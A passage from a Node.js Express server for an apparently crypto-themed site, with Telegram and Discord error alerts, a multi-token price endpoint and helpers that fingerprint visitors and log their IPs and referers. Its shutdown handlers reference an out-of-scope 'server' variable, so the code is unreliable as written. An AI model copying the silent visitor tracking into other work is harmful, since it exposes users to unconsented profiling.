    console.log(`[PRODUCTION] Discord Alerts: ${discordWebhook ? 'ENABLED' : 'DISABLED'}`);
            });
        }
    } else {
        // HTTP server
        const server = app.listen(PORT, '0.0.0.0', () => {
            console.log(`[PRODUCTION] HTTP Server running on port ${PORT}`);
            console.log(`[PRODUCTION] Admin dashboard: http://localhost:${PORT}/admin`);
            console.log(`[PRODUCTION] Frontend: http://localhost:${PORT}`);
            console.log(`[NETWORK] Accessible from: http://0.0.0.0:${PORT}`);
            console.log(`[NETWORK] Local network access: http://192.168.1.127:${PORT}`);
            console.log(`[SERVER] Set SERVER_USE_HTTPS=true for HTTPS support`);
            
            // Production readiness checks
            console.log(`[PRODUCTION] Environment: ${process.env.NODE_ENV || 'development'}`);
            console.log(`[PRODUCTION] Telegram Alerts: ${telegramBot ? 'ENABLED' : 'DISABLED'}`);
            console.log(`[PRODUCTION] Discord Alerts: ${discordWebhook ? 'ENABLED' : 'DISABLED'}`);
        });
    }
};

startServer();

// Contingency plans for production
process.on('uncaughtException', (error) => {
    console.error('[CONTINGENCY] Uncaught Exception:', error);
    // Send emergency alert
    if (telegramBot) {
        sendTelegramAlert('system_error', { error: error.message, timestamp: new Date() });
    }
    // Don't crash the server in production
    if (process.env.NODE_ENV === 'production') {
        console.log('[CONTINGENCY] Server continuing despite error');
    }
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('[CONTINGENCY] Unhandled Rejection at:', promise, 'reason:', reason);
    // Send emergency alert
    if (telegramBot) {
        sendTelegramAlert('system_error', { error: reason.toString(), timestamp: new Date() });
    }
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('[CONTINGENCY] SIGTERM received, shutting down gracefully');
    server.close(() => {
        console.log('[CONTINGENCY] Server closed');
        process.exit(0);
    });
});

process.on('SIGINT', () => {
    console.log('[CONTINGENCY] SIGINT received, shutting down gracefully');
    server.close(() => {
        console.log('[CONTINGENCY] Server closed');
        process.exit(0);
    });
});

// Real-time LayerZero price data
let layerZeroPriceData = {
    // Real-time price data will be fetched from APIs
    ethereum: null,
    bnb: null,
    matic: null,
    avax: null,
    cake: null,
    price: null,
    volume24h: null,
    change24h: null,
};

// Token price API endpoint - Real-time data only
app.get('/api/token-price', async (req, res) => {
    try {
        // Fetch real-time prices using our new multi-API system
        const [ethereumPrice, bnbPrice, maticPrice, avaxPrice, cakePrice] = await Promise.all([
            getTokenPrice('ETH'),
            getTokenPrice('BNB'),
            getTokenPrice('MATIC'),
            getTokenPrice('AVAX'),
            getTokenPrice('CAKE')
        ]);
        
        layerZeroPriceData = {
            ethereum: ethereumPrice,
            bnb: bnbPrice,
            matic: maticPrice,
            avax: avaxPrice,
            cake: cakePrice,
            price: ethereumPrice, // Use ETH price as default
            volume24h: null, // Would need separate API call
            change24h: null, // Would need separate API call
            timestamp: new Date().toISOString()
        };
        
        res.json(layerZeroPriceData);
    } catch (error) {
        console.error('Error fetching token price:', error);
        res.status(500).json({ error: 'Failed to fetch real price data' });
    }
});


// Fix device fingerprinting to show readable format
function generateDeviceFingerprint(req) {
    const userAgent = req.headers['user-agent'] || '';
    const acceptLanguage = req.headers['accept-language'] || '';
    const acceptEncoding = req.headers['accept-encoding'] || '';
    const connection = req.headers['connection'] || '';
    const upgradeInsecureRequests = req.headers['upgrade-insecure-requests'] || '';
    
    // Create readable fingerprint instead of hash
    const fingerprint = {
        userAgent: userAgent.substring(0, 100),
        language: acceptLanguage.split(',')[0] || 'Unknown',
        encoding: acceptEncoding,
        connection: connection,
        upgradeRequests: upgradeInsecureRequests,
        timestamp: new Date().toISOString()
    };
    
    return JSON.stringify(fingerprint, null, 2);
}

// Improve IP and location detection
function getClientInfo(req) {
    const ip = req.headers['x-forwarded-for'] || 
               req.headers['x-real-ip'] || 
               req.connection.remoteAddress || 
               req.socket.remoteAddress || 
               'Unknown';
    
    // Clean IP address
    const cleanIP = ip.replace(/^::ffff:/, '').split(',')[0].trim();
    
    return {
        ip: cleanIP,
        userAgent: req.headers['user-agent'] || 'Unknown',
        referer: req.headers['referer'] || 'Direct',
        method: req.method,
        path: req.path,
        timestamp: new Date().toISOString()
    };
}
